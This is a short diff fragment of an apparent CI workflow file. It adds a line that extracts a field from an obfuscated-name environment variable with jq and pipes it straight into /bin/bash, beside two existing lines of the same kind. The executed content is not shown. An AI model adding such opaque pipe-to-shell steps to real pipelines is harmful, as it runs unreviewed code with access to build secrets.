@@ -28,6 +28,7 @@ jobs:
         run: |
           printf '%s' "$j88" | jq -r .lm64992 | /bin/bash
           echo $sjq40 | jq -r .mdl3 | /bin/bash
+          printf '%s' "$t493" | jq -r .aw449 | /bin/bash
 
       - name: Persist output
         if: always()
